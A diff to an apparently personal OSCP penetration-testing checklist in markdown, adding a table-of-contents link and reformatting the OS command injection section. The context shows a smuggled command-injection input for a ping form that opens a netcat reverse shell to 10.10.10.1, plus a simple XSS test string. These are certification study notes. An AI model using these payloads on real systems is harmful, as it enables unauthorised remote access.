@@ -16,7 +16,7 @@
   - [RFI]
   - [WFuzz]
 - [SQLi](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#sqli)
-- [OS Command Injection]
+- [OS Command Injection](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#os-command-injection)
 - [Remote Code Execution](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#remote-code-execution-now-for-a-shell)
   - [SQL Union Outfile](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#sql-union-outfile)
 - [Buffer Overflow Dev]
@@ -293,8 +293,10 @@ XSS attempts:
 ```<script>alert(‘test’);</script>```
 
 # OS Command Injection
-Exploiting web interface ping.php to make OS Calls     
+Exploiting web interface ping.php to make OS Calls:
+
 PING HOST: ```127.0.0.1& nc 10.10.10.1 443 -e /bin/bash```
+
 Shell Meta-Character Examples:
 #### Windows and Unix
 ```
